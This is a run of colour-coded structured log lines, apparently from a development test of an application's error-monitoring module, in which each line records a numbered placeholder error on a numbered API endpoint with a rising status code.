WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806004Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2218'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2219'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806098Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2220'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2221'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806195Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2222'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806321Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2223'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806391Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2224'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806445Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2225'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806497Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2226'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806547Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2227'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806597Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2228'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806648Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2229'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806697Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2230'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806745Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2231'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806793Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2232'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2233'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806888Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2234'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2235'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.806990Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2236'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807039Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2237'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807089Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2238'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807152Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2239'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2240'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807309Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2241'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807363Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2242'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807415Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2243'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807464Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2244'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807514Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2245'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807564Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2246'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807614Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2247'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807663Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2248'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807712Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m45[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2249'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807761Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2250'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2251'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807863Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2252'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2253'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.807960Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2254'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808008Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2255'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2256'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808158Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2257'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
